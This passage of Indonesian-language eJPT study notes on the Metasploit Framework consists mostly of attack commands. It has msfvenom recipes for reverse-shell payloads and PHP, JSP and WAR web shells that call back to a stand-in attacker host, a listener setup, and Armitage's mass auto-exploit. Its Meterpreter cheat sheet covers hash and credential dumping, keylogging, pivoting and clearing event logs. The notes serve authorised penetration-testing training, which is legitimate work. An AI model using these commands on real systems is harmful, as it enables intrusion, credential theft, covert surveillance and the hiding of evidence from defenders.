msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f elf -o linux32_payload

# ─── WEB SHELLS ────────────────────────────────────────────

# PHP
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php

# JSP (Java/Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war

# ─── ANDROID ───────────────────────────────────────────────

msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -o payload.apk

# ─── MACOS ─────────────────────────────────────────────────

msfvenom -p osx/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f macho -o payload.macho
```

### Multi/Handler Listener

```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp  # harus sama dengan payload
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j
```

---

## 10. Armitage

### Apa itu Armitage?

Armitage adalah **GUI front-end** untuk Metasploit Framework. Memvisualisasikan target dan menyederhanakan proses exploitation.

### Menjalankan Armitage

```bash
service postgresql start
msfdb init
armitage
```

### Workflow di Armitage

```
1. HOST DISCOVERY   → Hosts → Nmap Scan → Intense Scan
2. FIND ATTACKS     → Attacks → Find Attacks (saran exploit otomatis)
3. EXPLOITATION     → Klik kanan host → Attack → pilih exploit
4. INTERACT         → Klik kanan host owned → Meterpreter → Interact
5. HAIL MARY        → Attacks → Hail Mary (auto-exploit semua, gunakan hati-hati)
```

### Fitur Penting

| Fitur | Cara Akses | Fungsi |
|---|---|---|
| Nmap Scan | Hosts → Nmap Scan | Scan host & service |
| Find Attacks | Attacks → Find Attacks | Saran exploit otomatis |
| Hail Mary | Attacks → Hail Mary | Auto-exploit semua target |
| MSF Console | View → Console | Akses msfconsole langsung |
| Sessions | View → Sessions | Manage semua sesi |
| File Browser | Klik kanan → Access → Browse Files | GUI file manager |

---

## Quick Reference

### Cheat Sheet Msfconsole

```bash
search <keyword>         → cari module
use <module>             → pilih module
info                     → info module
show options             → lihat opsi
set <OPTION> <value>     → set nilai
run / exploit            → jalankan
sessions -l              → list sesi
sessions -i <id>         → masuk ke sesi
sessions -u <id>         → upgrade ke meterpreter
background / Ctrl+Z      → background sesi
```

### Cheat Sheet Meterpreter

```bash
sysinfo / getuid         → info sistem & user
getsystem                → escalate ke SYSTEM
hashdump                 → dump password hash
load kiwi → creds_all    → dump semua credentials (Mimikatz)
shell                    → akses OS shell
download / upload        → transfer file
portfwd add              → port forwarding
run autoroute            → setup pivot route
keyscan_start/dump       → keylogger
screenshot               → ambil screenshot
clearev                  → hapus event logs
background               → background sesi
```

### Cheat Sheet Msfvenom

```bash
# Windows x64 reverse meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe

# Linux x64 reverse meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Handler
use multi/handler
set PAYLOAD <sama dengan payload>
set LHOST 0.0.0.0
set LPORT 4444
run -j
```

### Module Path Format

```
auxiliary/scanner/smb/smb_version
exploit/windows/smb/ms17_010_eternalblue
post/windows/gather/hashdump
post/linux/gather/hashdump
payload/windows/meterpreter/reverse_tcp
```

---

*Dibuat untuk studi eJPT — The Metasploit Framework*
*Gunakan hanya di lingkungan yang telah mendapat izin*
